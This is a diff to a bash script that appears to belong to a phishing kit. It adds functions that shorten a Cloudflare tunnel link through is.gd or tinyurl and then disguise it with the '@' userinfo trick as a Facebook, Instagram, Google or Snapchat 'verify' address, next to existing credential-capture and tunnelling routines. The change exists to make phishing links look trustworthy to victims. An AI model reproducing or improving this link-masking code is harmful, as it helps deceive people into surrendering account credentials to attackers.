@@ -197,6 +197,59 @@ capture_data() {
     done
 }
 
+## URL SHORTENER WITH ACTUAL SHORTENING
+shorten_url() {
+    long_url="$1"
+    short_url=""
+    
+    # Try is.gd first
+    echo -ne "\n${GREEN}[+]${CYAN} Shortening URL...${WHITE}"
+    short=$(curl -s "https://is.gd/create.php?format=simple&url=${long_url}" 2>/dev/null)
+    
+    if [[ "$short" == http* && "$short" != *"error"* ]]; then
+        short_url="$short"
+    else
+        # Try tinyurl as backup
+        short=$(curl -s "https://tinyurl.com/api-create.php?url=${long_url}" 2>/dev/null)
+        if [[ "$short" == http* ]]; then
+            short_url="$short"
+        fi
+    fi
+    
+    echo "$short_url"
+}
+
+custom_mask() {
+    case $website in
+        facebook|facebook_security) echo "https://facebook.com-verify" ;;
+        instagram|instagram_followers) echo "https://instagram-verify" ;;
+        google) echo "https://google-security" ;;
+        snapchat) echo "https://snapchat-verify" ;;
+        *) echo "https://secure-verify" ;;
+    esac
+}
+
+custom_url() {
+    url="$1"
+    
+    echo -e "\n${RED}[-]${BLUE} Original URL : ${GREEN}${url}${WHITE}"
+    
+    # Get shortened URL
+    short_url=$(shorten_url "$url")
+    
+    if [[ -n "$short_url" ]]; then
+        echo -e "\n${RED}[-]${BLUE} Short URL    : ${GREEN}${short_url}${WHITE}"
+        
+        # Create masked URL
+        mask=$(custom_mask)
+        masked="${mask}@${short_url#https://}"
+        echo -e "\n${RED}[-]${BLUE} Masked URL   : ${ORANGE}${masked}${WHITE}"
+    else
+        echo -e "\n${RED}[!] URL shortening failed${WHITE}"
+        echo -e "${RED}[-]${BLUE} Use original : ${GREEN}${url}${WHITE}"
+    fi
+}
+
 start_cloudflared() {
     rm -f .server/.cld.log
     cusport
@@ -215,18 +268,11 @@ start_cloudflared() {
     cldflr_url=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null)
 
     if [[ -n "$cldflr_url" ]]; then
-        echo -e "\n${RED}[-]${BLUE} URL: ${GREEN}$cldflr_url${WHITE}"
         custom_url "$cldflr_url"
     else
         echo -e "\n${RED}[!] URL generation failed. Check hotspot.${WHITE}"
     fi
     capture_data
-}
-
-custom_url() {
-    url=${1#http*//}
-    echo -e "\n${RED}[-]${BLUE} Share this link:${WHITE}"
-    echo -e "${GREEN}https://$url${WHITE}"
 }
 
 start_localhost() {
